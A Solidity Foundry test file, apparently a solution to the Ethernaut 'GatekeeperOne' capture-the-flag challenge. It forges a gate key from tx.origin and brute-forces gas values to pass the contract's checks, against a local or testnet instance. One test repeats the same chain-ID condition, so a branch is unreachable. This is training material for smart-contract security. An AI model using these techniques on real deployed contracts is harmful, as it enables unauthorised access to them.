// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

// cast interface src/GatekeeperOne.sol:GatekeeperOne
interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

contract Exp is Test {
    IGatekeeperOne public contractInstance;
    address deployer = makeAddr("deployer"); // 0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946
    address attacker = makeAddr("attacker"); // 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
    // address temp = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;

    function setUp() public {
        // uint256   sepoliaFork = vm.createSelectFork("sepolia");
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
    }

    // forge test --mt testToEntrantGate -vvvv
    // forge test --mt testToEntrantGate --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
    // forge inspect src/Privacy.sol storage
    // forge inspect Privacy storage
    // cast storage 0xfD4C069cE55DB1E84e763951A76Be0cabb35C2cB 0 --rpc-url $ARBITRUM_SEPOLIA_RPC_URL //data[0]
    function testToEntrantGate() public {
        console2.log("Running in testToEntrantGate...");
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);

        if (chainId == 31337) {
            vm.startPrank(deployer);
            contractInstance = IGatekeeperOne(address(new GatekeeperOne()));
            vm.stopPrank();
        } else if (chainId == 421614) {
            contractInstance = IGatekeeperOne(payable(0xfD4C069cE55DB1E84e763951A76Be0cabb35C2cB));
        } else {
            return;
        }

        // calculateAddress(temp);
        console2.log("tx.origin address:", tx.origin);
        bytes8 finalBytes8 = calculateAddress(tx.origin);
        Attacter attacterContract = new Attacter(address(contractInstance));
        // 先Fork测试找到gasToTry的确切值24829 ，再调用attack2去真实环境攻击
        attacterContract.attack(finalBytes8); // local 24989  arbitrum 24829
            // attacterContract.attack2(finalBytes8);
    }

    // forge test --mt testGateOneGasLeft -vvvv
    // forge test --mt testGateOneGasLeft --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
    function testGateOneGasLeft() public {
        console2.log("Running in testToEntrantGate...");
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);

        if (chainId == 421614) {
            vm.startPrank(deployer);
            contractInstance = IGatekeeperOne(address(new GatekeeperOne()));
            vm.stopPrank();
        } else if (chainId == 421614) {
            contractInstance = IGatekeeperOne(payable(0xfD4C069cE55DB1E84e763951A76Be0cabb35C2cB));
        } else {
            return;
        }
        console2.log("tx.origin address:", tx.origin);
        bytes2 originAddressLast2Bytes = bytes2(uint16(uint160(tx.origin)));
        bytes8 gateKey = bytes8(uint64(uint16(originAddressLast2Bytes)) + 2 ** 32);
        console2.log("before enter gasleft", gasleft());
        contractInstance.enter{gas: 24829}(gateKey); // local 473 arbitrum 473
    }

    function calculateAddress(address addr) public pure returns (bytes8) {
        //取最后两个字节 如1234
        bytes2 lastTwoBytes = bytes2(uint16(uint160(addr)));
        console2.log("lastTwoBytes: ");
        console2.logBytes2(lastTwoBytes);
        //再补两个字节 全是0  如00001234
        console2.log("lastFourBytes: ");
        uint32 lastFourBytes = uint32(uint16(lastTwoBytes));
        console2.logBytes4(bytes4(lastFourBytes));

        bytes8 finalBytes8 = bytes8((uint64(0x01234567) << 32) | lastFourBytes);
        console2.log("finalBytes8: ");
        console2.logBytes8(finalBytes8);
        return finalBytes8;
    }
}

contract Attacter {
    IGatekeeperOne public contractInstance;

    constructor(address _contractInstance) {
        contractInstance = IGatekeeperOne(_contractInstance);
    }
    // 先Fork测试找到gasToTry的确切值24829 ，再调用attack2去真实环境攻击

    function attack(bytes8 _gateKey) public {
        for (uint256 i = 0; i < 8191; i++) {
            uint256 gasToTry = i + 150 + 8191 * 3; // 加个偏移防止太小
            try contractInstance.enter{gas: gasToTry}(_gateKey) returns (bool success) {
                console2.log("Success with gas:", gasToTry, "i:", i);
                break;
            } catch {
                // 可以选择不打日志，提升速度
            }
        }
    }

    function attack2(bytes8 _gateKey) public {
        try contractInstance.enter{gas: 24829}(_gateKey) returns (bool success) {}
        catch {
            // 可以选择不打日志，提升速度
        }
    }
}
